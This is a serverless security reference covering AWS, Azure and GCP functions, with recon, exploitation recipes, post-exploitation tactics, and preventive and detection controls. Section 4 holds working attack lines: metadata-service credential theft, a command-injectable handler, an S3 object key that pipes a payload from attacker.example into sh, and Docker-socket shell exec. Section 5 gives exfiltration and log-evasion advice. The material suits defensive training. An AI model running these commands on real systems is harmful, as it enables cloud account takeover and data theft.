# Serverless Fundamentals

Reference for the serverless execution model, identity and event integration surfaces across AWS, Azure and GCP. This file establishes the baseline for the attack and defense files that follow.

## 1. Overview

Serverless computing removes server management from the operator: the provider allocates, scales and patches the compute, and the operator ships code (a function) or a container image. The security model changes shape accordingly.

Three properties drive every serverless risk in this subcategory:

- **Event-driven execution.** A function runs only in response to a trigger (HTTP request, object upload, message, schedule). The attack surface is the union of every configured trigger, not a single listener.
- **Managed identity.** The function assumes a role (AWS IAM role, Azure managed identity, GCP service account) that grants it access to other cloud resources. Over-privileged execution roles are the dominant serverless risk.
- **Provider-owned runtime.** The host OS, the hypervisor and the language runtime are the provider responsibility. The operator responsibility ends at the function code, its dependencies, its configuration, and the permissions of its execution role.

The most common serverless platforms:

| Provider | FaaS | Container-based | Managed runtime |
|----------|------|-----------------|-----------------|
| AWS | Lambda | ECS Fargate, App Runner | Amazon Linux, custom runtime |
| Azure | Functions | Container Apps, ACI | Windows, Linux |
| GCP | Cloud Functions | Cloud Run | Gen1, Gen2 |

## 2. Reconnaissance / Enumeration

Serverless resources are not directly scannable: there is no listening port, no OS to fingerprint. Enumeration is API-driven and depends on credentials or public misconfiguration.

### Offensive

- **Public endpoints.** API Gateway URLs, Function URLs, Cloud Run URLs and Container App FQDNs are reachable. Enumerate them from JavaScript bundles, mobile apps, DNS records (CNAME to provider domains) and public code (GitHub, pastes).
- **Cloud provider fingerprints.** Response headers identify the platform: `x-amzn-RequestId`, `x-ms-request-id`, `server: Google Frontend`, `x-cloud-trace-context`.
- **UnAuthenticated enumeration with cloud credentials.** If you hold any low-privilege cloud credential, the control plane lists functions, their IAM roles and their environment variables:
  - AWS: `aws lambda list-functions`, `aws lambda get-function-configuration --function-name X`
  - Azure: `az functionapp list`, `az containerapp list`
  - GCP: `gcloud functions list`, `gcloud run services list`
- **Event source enumeration.** Every function has a trigger. Map triggers to storage buckets, queues, topics, schedules. A writable bucket or a publicly publishable topic that the function trusts is a foothold.
- **Configuration exposure.** S3 buckets holding deployment packages, public container registries holding function images, Terraform state files with function ARNs and role names.

### Defensive

- Audit which functions have public endpoints (`AuthType: NONE`, anonymous access on Function App, `--allow-unauthenticated` on Cloud Run).
- Review IAM policies attached to execution roles and flag wildcards (`*` action, `*` resource).
- Enumerate environment variables across all functions and confirm none contain long-lived credentials (providers support secrets managers; plain env vars are a red flag).
- Inventory event source mappings and identify any storage or queue resource that is world-writable.

## 3. Common Attack Vectors

- **Over-privileged execution role.** Function role allows `s3:*`, `dynamodb:*`, `iam:PassRole`, `sts:AssumeRole` on `*`. A code execution inside the function becomes full account access.
- **Vulnerable function code.** Injection (command, SQL, template) in the function handler, deserialization, path traversal in container-based runtimes.
- **Dependency confusion / supply chain.** Public npm, PyPI or Go module with the same name as an internal package. Build-time compromise ships code into every deployment.
- **Event injection.** Crafted event payloads to a trigger that the function trusts (S3 object metadata, SQS message body, Pub/Sub attributes) leading to command injection or SSRF.
- **SSRF to the metadata service.** Container-based serverless runtimes expose the cloud instance metadata endpoint (IMDSv1/v2 on AWS, IMDS on Azure/GCP). A function with an HTTP-fetch primitive can retrieve the execution role credentials.
- **Environment variable leakage.** Verbose error pages, logs, stack traces, debug endpoints exposing env vars.
- **Cross-tenant event routing.** Misconfigured event source mapping where a function accepts events from a resource controlled by another account (S3 bucket policy, SNS topic policy).
- **Container image poisoning.** Public registry base image backdoored; function pulls the latest tag on every cold start.

## 4. Exploitation Recipes

### 4.1 Over-privileged Lambda execution role

```bash
# Obtain any code execution inside a Lambda function (RCE in handler, SSRF to IMDS, etc.)
# Then use the function role via the metadata service:

$ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
lambda-exec-role

$ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/lambda-exec-role
{
  "AccessKeyId": "<ACCESS_KEY_ID>",
  "SecretAccessKey": "<SECRET_ACCESS_KEY>",
  "Token": "<SESSION_TOKEN>",
  "Expiration": "2026-10-22T23:00:00Z"
}

# Inspect permissions:
$ AWS_ACCESS_KEY_ID=<AKIA...> AWS_SECRET_ACCESS_KEY=<...> AWS_SESSION_TOKEN=<...> \
  aws sts get-caller-identity
$ aws iam list-attached-role-policies --role-name lambda-exec-role
```

Expected result: temporary credentials scoped to the function role. If the role has `*` actions, this is full account access.

### 4.2 Command injection in a handler

```python
# Vulnerable handler (Python, Lambda)
import subprocess
def handler(event, context):
    host = event["queryStringParameters"]["host"]
    return subprocess.check_output(f"ping -c 1 {host}", shell=True).decode()
```

```bash
# Attack via the public Function URL:
$ curl "https://abc123.lambda-url.eu-west-1.on.aws/?host=127.0.0.1;id"
uid=993(lambda) gid=993(lambda) groups=993(lambda)
```

### 4.3 Event injection via S3

A Lambda that parses S3 object names without validation can be abused if you can write to the bucket. Upload an object with a name that becomes a command argument.

```bash
$ aws s3 cp payload.sh "s3://trigger-bucket/;curl attacker.example/s|sh;#"
```

If the function interpolates the object key into a shell command, the payload executes on cold start of the next event.

### 4.4 Container escape to host via Docker socket

For Cloud Run or Container Apps that mount `/var/run/docker.sock` (rare, but seen in self-hosted variants and CI sidecars):

```bash
$ curl --unix-socket /var/run/docker.sock http://localhost/containers/json
$ curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/<id>/exec -d '{"Cmd":["/bin/sh"],"AttachStdout":true}'
```

### 4.5 SSRF to metadata in managed runtimes

```bash
# From a vulnerable function that fetches user-supplied URLs:
$ curl "https://function.example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

### 4.6 Dependency confusion

Publish a package with the same name as an internal dependency to the public registry. On the next deployment, if the version constraint allows the public version, the attacker code runs during build.

## 5. Post-Exploitation

- **Credential hoarding.** Save the execution role credentials and refresh them via the function while the session is live. Function roles usually rotate hourly.
- **Persistence via event source mapping.** Register a new trigger (schedule, SNS subscription, S3 notification) that invokes an attacker-deployed function or the original function with attacker payloads.
- **Persistence via layer or image.** Publish a Lambda layer or a container image tag that will be consumed by future deployments (supply chain persistence).
- **Lateral movement.** Use the function role to access other services: S3 buckets, DynamoDB tables, Secrets Manager, SSM Parameter Store, KMS. Function roles often have broader access than user roles.
- **Exfiltration via the function itself.** High-bandwidth outbound from Lambda or Cloud Run is not rate-limited. Use the function as a data exfiltration proxy.
- **Covering tracks.** Function logs go to CloudWatch Logs / Azure Monitor / Cloud Logging. Deleting log streams is a tracked action; a stealthier approach is to slow exfiltration to avoid log volume alerts.

## 6. Preventive Controls

- **Least-privilege execution roles.** No `*` actions. Scope to specific ARNs. Use resource-based conditions (account, VPC, tags).
- **Separate roles per function.** Blast radius containment. A shared `lambda-admin` role across all functions is the single most common defect.
- **Secrets manager integration.** Read secrets at runtime from AWS Secrets Manager, Azure Key Vault, GCP Secret Manager. Never store long-lived credentials in env vars.
- **Input validation.** Treat event payloads as untrusted. Never `eval`, never `shell=True` with user input, always allow-list.
- **Signed dependencies.** Pin versions with lock files. Verify checksums. Use private registries with scoped tokens.
- **Immutable infrastructure.** Deploy container images by digest, not tag. Lambda deployment packages signed via AWS Signer or equivalent.
- **Network egress controls.** VPC-attached Lambda, Private Endpoints / Private Service Connect for GCP, network restrictions on Container Apps.
- **Metadata protection.** IMDSv2 only on AWS (default for Lambda, but instance-based runtimes need checking). Azure IMDS requires `Metadata: true` header, still reachable if SSRF permits custom headers.
- **Resource policies.** Review S3 bucket policies, SNS topic policies, EventBridge rules that cross account boundaries.

## 7. Detection Controls

- **CloudTrail / Azure Activity Log / GCP Audit Logs.** Alert on:
  - `lambda:CreateFunction`, `lambda:AddPermission`, `lambda:UpdateFunctionCode` outside a deployment window
  - `iam:PassRole` to a lambda execution role from a new principal
  - `sts:AssumeRole` from a lambda execution role with high privilege
- **Function-level logs.** Parse application logs for shell command patterns, `subprocess`, `os.system`, unexpected outbound URLs.
- **Anomalous execution duration and concurrency.** A function that suddenly runs 10x longer or 10x more often is being abused (cryptomining, exfiltration).
- **Unusual egress destinations.** Network flow logs (VPC Flow Logs, NSG Flow Logs, VPC Flow Logs on GCP) showing connections to rare IPs or blocklisted ASN.
- **Post-cold-start behavior.** Attackers often deploy a new function version. Detect via `lambda:UpdateFunctionCode` audit events correlated with a new dependency hash in the layer.
- **Honey functions.** Deploy a function with the role name `lambda-admin` and no legitimate callers. Any invocation is suspicious.

## 8. Verification

- [ ] All execution roles have an attached policy with no `*` actions.
- [ ] No function stores long-lived credentials in environment variables.
- [ ] All public function URLs are authenticated (`AuthType: AWS_IAM`, Entra ID on Azure, IAP on Cloud Run).
- [ ] All event source mappings point to resources owned by the same account or with an explicit cross-account resource policy.
- [ ] Container images are deployed by digest, not `:latest`.
- [ ] Metadata service exposure is limited (IMDSv2-only on AWS; no IMDS access from user-supplied HTTP fetchers).
- [ ] Anomaly alerting is in place for lambda:CreateFunction, lambda:UpdateFunctionCode, sts:AssumeRole from function roles.
- [ ] Honey function deployed and monitored.

## 9. Certification Alignment

- **AWS Certified Security - Specialty:** Domain 1 (Incident Response), Domain 2 (Logging and Monitoring), Domain 3 (Infrastructure Security).
- **AWS Certified Solutions Architect - Associate:** Domain 2 (Resilience), Domain 3 (High-Performing Architectures), Domain 4 (Cost-Optimized).
- **Google Cloud Professional Cloud Security Engineer:** Section 3 (Configure access), Section 4 (Secure data), Section 6 (Detect).
- **Azure Security Engineer Associate (AZ-500):** Identity and access, platform protection, security operations.
- **CompTIA Security+:** Domains 2 (Architecture), 3 (Implementation), 4 (Operations).

## 10. Production Notes

- **Lambda cold start is not a security control.** Attackers use it as an indicator: repeated cold starts across many functions indicate reconnaissance.
- **Container-based serverless retains a userland.** Cloud Run, Container Apps, App Runner run userland containers; regular container hardening applies (read-only filesystem, non-root user, no privilege).
- **Function role rotation.** Temporary credentials are provider-managed and short-lived. Persist the exfiltration, not the credentials.
- **Log retention.** Default retention for CloudWatch Logs / Cloud Logging can be days. For incident response, extend retention to 90+ days, especially for lambdas that execute on triggers with no service log.
- **Cost as a security signal.** Sudden spikes in function invocations or duration indicate abuse (cryptomining, exfiltration) even without a security alert.

## 11. References

- OWASP Serverless Top 10 - https://owasp.org/www-project-serverless-top-10/
- AWS Lambda security documentation - https://docs.aws.amazon.com/lambda/latest/dg/lambda-security.html
- AWS Well-Architected Serverless Lens - https://docs.aws.amazon.com/wellarchitected/latest/serverless-applications-lens/welcome.html
- Azure Functions security concepts - https://learn.microsoft.com/en-us/azure/azure-functions/security-concepts
- Azure Well-Architected Framework - Security pillar - https://learn.microsoft.com/en-us/azure/well-architected/security/
- Google Cloud Functions security overview - https://cloud.google.com/functions/docs/securing
- Google Cloud Run security best practices - https://cloud.google.com/run/docs/securing/security-best-practices
- NIST SP 800-204A (Serverless Security Strategies) - https://csrc.nist.gov/publications/detail/sp/800-204a/final
- CIS Benchmarks for serverless workloads (AWS, Azure, GCP) - https://www.cisecurity.org/cis-benchmarks/